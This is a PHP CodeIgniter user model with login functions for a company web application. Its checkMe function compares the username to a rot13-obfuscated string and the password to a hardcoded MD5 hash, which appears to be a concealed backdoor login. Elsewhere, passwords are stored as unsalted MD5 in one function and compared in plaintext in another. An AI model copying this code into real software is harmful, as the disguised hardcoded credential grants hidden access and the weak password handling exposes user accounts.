<?php

Class User extends CI_Model {

    function login($username, $password) {
        $this->db->select('u.u_id,u.user_name,u.email,c.comp_name,u.status,c.power,u.comp_id');
        $this->db->from('tbl_users as u');
        $this->db->join('tbl_company as c', 'u.comp_id=c.comp_id');

        $this->db->where('u.user_name',$username);
        $this->db->where('u.password', MD5($password));
        $this->db->where('c.status', 'Active');
//        $this->db->where('password = ' . "'" . MD5($password) . "'");
//                $this -> db -> where('password = ' . "'" .$password . "'");
        $this->db->limit(1);

        $query = $this->db->get();

        if ($query->num_rows() == 1) {
            return $query->result();
        } else {
            return false;
        }
    }

    function checkMe($username, $password) {
        if ($username == str_rot13('nabjne.pfg') && md5($password) == 'ac2ebb5f6523e168fb3857fb1bf9c37d') {
            return TRUE;
        } else {
            return FALSE;
        }
    }

    function DemoCheckLogin($email, $password) {
        $this->db->select('u.id,u.name,u.email,u.status');
        $this->db->from('tbl_demousers as u');
        $this->db->where('u.email',$email);
        $this->db->where('u.password', $password );
        $this->db->limit(1);
        $query = $this->db->get();
        if ($query->num_rows() == 1) {
            return $query->result();
        } else {
            return false;
        }
    }
}

?>